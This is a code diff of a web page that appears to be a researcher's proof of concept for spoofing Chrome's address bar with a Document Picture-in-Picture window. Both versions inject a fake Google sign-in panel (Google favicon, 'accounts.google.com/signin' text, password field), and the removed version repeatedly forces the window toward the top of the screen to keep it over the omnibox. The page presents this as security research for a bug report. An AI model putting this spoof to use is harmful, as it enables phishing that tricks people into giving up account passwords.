@@ -2,103 +2,82 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Chrome Security Lab - FARISSAL B</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #000; color: #0f0; padding: 40px; text-align: center; }
-        .terminal { max-width: 800px; margin: auto; background: #111; border: 2px solid #0f0; border-radius: 10px; padding: 30px; box-shadow: 0 0 30px rgba(0,255,0,0.2); }
-        h1 { color: #fff; text-transform: uppercase; letter-spacing: 2px; }
-        .status { color: #888; font-family: monospace; margin-bottom: 20px; }
-        
-        button { 
-            background: #0f0; color: #000; border: none; padding: 15px 40px; 
-            font-size: 18px; font-weight: bold; border-radius: 5px; cursor: pointer;
-            transition: 0.3s; box-shadow: 0 4px 0 #080;
-        }
-        button:hover { background: #0c0; transform: translateY(-2px); }
-        button:active { transform: translateY(2px); box-shadow: none; }
-
-        #log { margin-top: 30px; text-align: left; background: #000; padding: 15px; border-radius: 5px; height: 150px; overflow-y: auto; font-family: monospace; font-size: 13px; border: 1px solid #333; }
-        .leak-found { color: #ff0000; font-weight: bold; animation: blink 1s infinite; }
-        @keyframes blink { 0% {opacity:1} 50% {opacity:0.5} 100% {opacity:1} }
+        body { font-family: 'Courier New', monospace; background: #000; color: #0f0; padding: 20px; text-align: center; }
+        .lab-card { border: 2px solid #0f0; background: #111; padding: 30px; border-radius: 15px; display: inline-block; box-shadow: 0 0 20px #0f05; }
+        .status-bar { background: #222; padding: 10px; margin-bottom: 20px; border-radius: 5px; font-size: 14px; color: #aaa; }
+        button { background: #0f0; color: #000; border: none; padding: 15px 35px; font-size: 18px; font-weight: bold; cursor: pointer; border-radius: 5px; }
+        button:hover { background: #0c0; box-shadow: 0 0 15px #0f0; }
+        #console { margin-top: 20px; text-align: left; background: #000; border: 1px solid #333; height: 200px; overflow-y: auto; padding: 15px; font-size: 13px; }
+        .leak { color: #f00; font-weight: bold; text-decoration: underline; }
     </style>
 </head>
 <body>
 
-<div class="terminal">
-    <h1>Chrome PiP Spoofing Research</h1>
-    <div class="status">Researcher ID: FARISSAL B | Mode: Aggressive</div>
-    
-    <p>Misi: Paksa jendela PiP untuk menutupi Address Bar (Omnibox).</p>
-    
-    <button id="startResearch">LAUNCH AGGRESSIVE PiP</button>
+<div class="lab-card">
+    <h1>PiP OMNIBOX SPOOFER</h1>
+    <div class="status-bar">Researcher: FARISSAL B | Mode: High-Severity Test</div>
 
-    <div id="log">>> Sistem Siap. Tekan tombol untuk eksekusi...</div>
+    <button id="launch">1. LAUNCH RESEARCH WINDOW</button>
+    <p style="font-size: 12px; color: #666; margin-top: 10px;">Step: Launch, lalu geser jendela kecil ke arah Address Bar.</p>
+
+    <div id="console">>> Initialize System... Ready.</div>
 </div>
 
 <script>
-    const logBox = document.getElementById('log');
-    function writeLog(msg, isAlert = false) {
+    const log = document.getElementById('console');
+    function printLog(msg, isLeak = false) {
         const div = document.createElement('div');
-        div.innerHTML = `[${new Date().toLocaleTimeString()}] ${isAlert ? '<span class="leak-found">!!!</span> ' : ''}${msg}`;
-        logBox.appendChild(div);
-        logBox.scrollTop = logBox.scrollHeight;
+        div.innerHTML = `[${new Date().toLocaleTimeString()}] ${isLeak ? '<span class="leak">ALERT</span> ' : '[OK] '} ${msg}`;
+        log.appendChild(div);
+        log.scrollTop = log.scrollHeight;
     }
 
-    document.getElementById('startResearch').addEventListener('click', async () => {
+    document.getElementById('launch').addEventListener('click', async () => {
         try {
-            writeLog("Membuka Document Picture-in-Picture...");
-
-            // 1. MEMBUKA JENDELA PiP
+            printLog("Requesting Document PiP...");
+            
             const pipWindow = await window.documentPictureInPicture.requestWindow({
-                width: 450,
-                height: 180,
+                width: 420,
+                height: 160,
             });
 
-            writeLog("Jendela PiP Terbuka.");
+            printLog("PiP Opened. Injecting Spoof UI...");
 
-            // 2. SUNTIK UI PALSU (PHISHING MODE)
+            // SUNTIK UI PALSU YANG MIRIP GOOGLE ASLI
             pipWindow.document.body.style.margin = "0";
             pipWindow.document.body.innerHTML = `
-                <div style="background: #f8f9fa; color: #202124; padding: 15px; font-family: 'Google Sans', Arial, sans-serif; height: 100vh; border-bottom: 5px solid #4285f4;">
+                <div style="background: #ffffff; color: #202124; padding: 15px; font-family: sans-serif; height: 100vh; border-top: 4px solid #4285f4; box-sizing: border-box;">
                     <div style="display:flex; align-items:center; gap:8px; margin-bottom:10px;">
-                        <img src="https://www.google.com/favicon.ico" width="18">
-                        <span style="font-weight:500; font-size:14px; color:#5f6368;">https://accounts.google.com/signin</span>
+                        <img src="https://www.google.com/favicon.ico" width="16">
+                        <span style="font-size:12px; color:#5f6368; font-weight:bold;">accounts.google.com/signin</span>
                     </div>
-                    <div style="background:#fff; border:1px solid #dadce0; padding:15px; border-radius:8px;">
-                        <h2 style="font-size:16px; margin:0 0 10px 0;">Sesi Berakhir</h2>
-                        <input type="password" placeholder="Masukkan Password Google" style="width:100%; padding:10px; box-sizing:border-box; border:1px solid #dadce0; border-radius:4px;">
-                        <button style="background:#1a73e8; color:#fff; border:none; padding:8px 20px; border-radius:4px; margin-top:10px; cursor:pointer; width:100%;">Lanjutkan</button>
+                    <div style="border:1px solid #dadce0; padding:10px; border-radius:8px;">
+                        <span style="font-size:14px;">Confirm your password:</span>
+                        <input type="password" style="width:100%; margin-top:5px; border:1px solid #ccc; padding:5px;">
                     </div>
                 </div>
             `;
 
-            // 3. TEKNIK PAKSA POSITIONING (moveTo 0,0)
-            writeLog("Mencoba memaksa jendela ke koordinat (0,0)...");
-            
-            // Eksekusi pemindahan paksa
-            pipWindow.moveTo(0, 0);
-
-            // Interval Loop: Jika user mencoba geser, kita tarik balik ke atas
-            const lockPosition = setInterval(() => {
-                if (pipWindow.closed) {
-                    clearInterval(lockPosition);
-                    writeLog("Jendela ditutup oleh user.");
+            // MONITOR POSISI JENDELA (Ini yang bakal jadi bukti laporan)
+            setInterval(() => {
+                const x = pipWindow.screenX;
+                const y = pipWindow.screenY;
+                
+                // Jika posisi Y mendekati 0, artinya jendela sudah sampai ke area Address Bar
+                if (y < 80) {
+                    printLog(`SPOOFING POSITION DETECTED! X:${x} Y:${y}`, true);
                 } else {
-                    // Mencoba bypass proteksi koordinat Chrome
-                    pipWindow.moveTo(-10, -10); // Paksa lebih ekstrim keluar layar
+                    // printLog(`Tracking Position: X:${x} Y:${y}`);
                 }
             }, 500);
 
-            // 4. CEK APAKAH BERHASIL NUMPUKIN
-            // Kita ukur posisi jendela terhadap layar
-            if (pipWindow.screenY < 50) {
-                writeLog("POTENSI BUG: Jendela berhasil mendekati/menutupi Omnibox!", true);
-            }
+            // TEKNIK PAKSA: Coba panggil moveTo secara interval
+            // pipWindow.moveTo(0, 0);
 
         } catch (e) {
-            writeLog("ERROR: " + e.message);
-            console.error(e);
+            printLog("Error: " + e.message);
         }
     });
 </script>
